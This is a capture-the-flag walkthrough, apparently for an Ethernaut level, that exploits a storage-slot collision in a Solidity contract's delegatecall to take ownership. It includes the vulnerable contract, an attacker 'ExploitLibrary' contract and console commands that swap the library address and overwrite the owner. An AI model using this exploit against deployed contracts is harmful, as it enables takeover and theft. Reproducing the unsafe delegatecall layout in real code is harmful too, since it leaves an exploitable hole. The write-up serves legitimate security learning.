# 16 Preservation

```
This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
Understanding what it means for delegatecall to be context-preserving.
Understanding how storage variables are stored and accessed.
Understanding how casting works between different data types.
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

```

#### Start 


### (1) `claim ownership`


From `06 Delegation` we learned that

```
when A `delegatecall()` to B, the code runs in contract B scope, 

but when updating storage it updates to contract A scope.

warning the storage structure must be the same
```
We'll talk about `warning the storage structure must be the same`

When you delegatecall to call an external function to change state storage and update your own state storage, there is a big risk. 

The structure of the stroage must be the same

Example: Why stroage must be the same
```
  Contract Preservation   {                                                    Storage            
    address public timeZone1Library;                                          |slot 0|<-|                          
    address public timeZone2Library;                                          |slot 1|  |             When contract Preservation use  LibraryContract.delegatecall()                
    address public owner;                                                     |slot 2|  |             storage it will update  at slot 0 (variable timeZone1Library) in contract Preservation
    uint storedTime;                                                          |slot 3|  |             because variable(storedTime) position Storage in LibraryContract is slot0 
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)")); |slot 4|  |             the variable name is irrelevant
  }                                                                                     |
                                                                                        |
                                                                                        |
                                                                                        |
Contract LibraryContract {                                                    Storage   |                                                                                                   
    uint storedTime;                                                          |slot 0|--|                                          
  }
```
From the example we can see that we want to update the value of the variable `storedTime` , but in fact it will update at `timeZone1Library`

Because it only thinks about the slot position, it doesn't care about the variable name when updating.

let's start

.

.

.



The process to claim Ownership 

- (1)  Create our contract at the same storage structure as the Preservation contract.
       so that we can change the owner at slot 2


  #### This is the code I used 
```
       // SPDX-License-Identifier: MIT
        pragma solidity ^0.8.0;

        contract ExploitLibrary  {
            // structure storage slot
            address public timeZone1Library;   // slot 0
            address public timeZone2Library;   // slot 1
            address public owner;              // slot 2
          
            
            function setTime(uint256 _time)  public{

              // address(uint160(uint256(x))) for convert uint256 -> address
              owner =  address(uint160(_time));
              
            }
        }
```

  - (2) We need to change value address `timeZone1Library` in contract Preservation to the address of our contract.

      
    #### Open Developer Tools (F12)

    type `await contract.setFirstTime('our contract address ')` and confirm transaction

    
    Check to make sure it becomes our address

     type `await web3.eth.getStorageAt(await contract.address,0)`  and you will see that now is our contract address.

  - (3) We will call  `function setFirstTime(uint _timeStamp) public `  again because it is now set owner change.

     type `await contract.setFirstTime('our address')` and confirm transaction



     


  
Click button Submit instance and confirm transaction 

# !!! we passed !!!




